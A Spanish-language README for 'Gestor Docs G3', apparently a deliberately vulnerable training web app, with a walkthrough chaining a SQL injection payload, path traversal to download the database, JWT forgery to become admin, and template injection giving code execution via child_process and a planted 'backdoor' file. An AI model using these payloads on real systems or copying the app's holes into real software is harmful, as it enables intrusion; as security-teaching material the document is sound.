# 📄 Gestor Docs G3

**Aplicación web para demostración de vulnerabilidades de seguridad**

---


## 🎯 **Flujo de Ataque**

Esta aplicación demuestra una **cadena de vulnerabilidades** que permite escalar privilegios desde usuario básico hasta control total del servidor:

### **📋 Pasos del Ataque:**

**1. 🔍 SQL Injection (Information Disclosure)**
- **Punto de entrada**: Login con usuario básico
- **Técnica**: Inyectar SQL malicioso para generar errores
- **Objetivo**: Obtener la ruta de la base de datos del error

**2. 📂 Path Traversal**  
- **Técnica**: Descargar la base de datos usando rutas relativas
- **Objetivo**: Acceder al archivo `g3.db` con todos los usuarios
- **Herramienta**: Abrir con DBeaver o DB Browser para SQLite

**3. 🎫 JWT Inseguro**
- **Técnica**: Modificar el token JWT en las cookies del navegador
- **Objetivo**: Cambiar el ID de usuario por el ID del admin
- **Explotación**: Backend no valida correctamente la integridad del token

**4. 💥 RCE (Remote Code Execution)**
- **Técnica**: Inyección de JavaScript en sistema de comentarios
- **Objetivo**: Ejecutar código arbitrario en el servidor
- **Escalación**: Control total del sistema

---

## 🚀 **Instalación y uso**

### **Requisitos previos:**
- Node.js 16+ 
- npm

### **Pasos de instalación:**

1. **Clonar el repositorio:**

2. **Instalar dependencias:**
```bash
npm install
```

3. **Inicializar base de datos:**
```bash
npm run initdb
```

4. **Ejecutar la aplicación:**
```bash
npm start
```

5. **Acceder a la aplicación:**
```
http://localhost:3000
```

### **Usuarios de prueba:**
| Usuario     | Contraseña  | Rol   |
|-------------|-------------|-------|
| admin       | admin123    | admin |
| user        | user123     | user  |
| manager     | manager123  | user  |
| guest       | guest123    | user  |
| superadmin  | super123    | admin |

---




### **PASO 1: 🔍 SQL Injection - Information Disclosure**

**Objetivo**: Obtener información sensible del sistema mediante errores SQL

**Procedimiento**:
1. Ir a `/login`
2. Usar usuario básico: `user` / `user123`
3. Interceptar la petición de login y modificar el username:
   ```
   Username: admin' OR '1'='1' UNION SELECT * FROM sqlite_master--
   ```
4. **Resultado**: Error SQL que expone:
   - Ruta de la base de datos: `backend/files/db/g3.db`
   - Estructura interna del servidor
   - Información de configuración

---

### **PASO 2: 📂 Path Traversal - Acceso a la Base de Datos**

**Objetivo**: Descargar la base de datos para análisis offline

**Procedimiento**:
1. Usar la ruta obtenida en el paso anterior
2. Acceder a: `/files/db/g3.db` o usar path traversal como `../files/db/g3.db`
3. Descargar el archivo `g3.db`
4. **Abrir con DBeaver o DB Browser for SQLite**
5. **Resultado**: Acceso a tabla `usuarios` con:
   - IDs de usuarios: `bdd96704ad0ad17e4cff8864e43a1686` (admin)
   - Usernames: `admin`, `user`
   - Contraseñas hasheadas (no útiles directamente)

---

### **PASO 3: 🎫 JWT Inseguro - Escalación de Privilegios**

**Objetivo**: Modificar el token JWT para obtener privilegios de admin

**Procedimiento**:
1. Hacer login con usuario básico (`user` / `user123`)
2. Abrir **Developer Tools** → **Application** → **Cookies**
3. Encontrar el token JWT en las cookies
4. **Decodificar el JWT** (usar jwt.io):
   ```json
   {
     "id": "id_del_usuario_basico",
     "username": "user",
     "rol": "user"
   }
   ```
5. **Modificar el payload**:
   ```json
   {
     "id": "bdd96704ad0ad17e4cff8864e43a1686",
     "username": "admin", 
     "rol": "admin"
   }
   ```
6. **Generar nuevo JWT** con la misma clave (o sin verificación)
7. **Reemplazar cookie** en el navegador
8. **Resultado**: Acceso como administrador

---

### **PASO 4: 💥 RCE - Ejecución Remota de Código**

**Objetivo**: Ejecutar código arbitrario en el servidor mediante comentarios

**Procedimiento**:
1. Con privilegios de admin, ir a **"Ver documentos"**
2. Seleccionar cualquier archivo PDF
3. En el sistema de comentarios, usar referencias con código malicioso:
   ```javascript
   Hola {{uploader}}, info del servidor: {{process.platform}} {{process.version}}
   ```
4. **Escalación a RCE completo**:
   ```javascript
   {{require('child_process').execSync('whoami').toString()}}
   ```
5. **Crear backdoor**:
   ```javascript
   {{require('fs').writeFileSync('backdoor.js', 'console.log("Server compromised!")')}}
   ```

---

### **🎯 RESULTADO FINAL**
- ✅ **Información sensible** obtenida via SQL Injection
- ✅ **Base de datos** descargada via Path Traversal  
- ✅ **Privilegios de admin** obtenidos via JWT manipulation
- ✅ **Control total del servidor** via RCE en comentarios



---


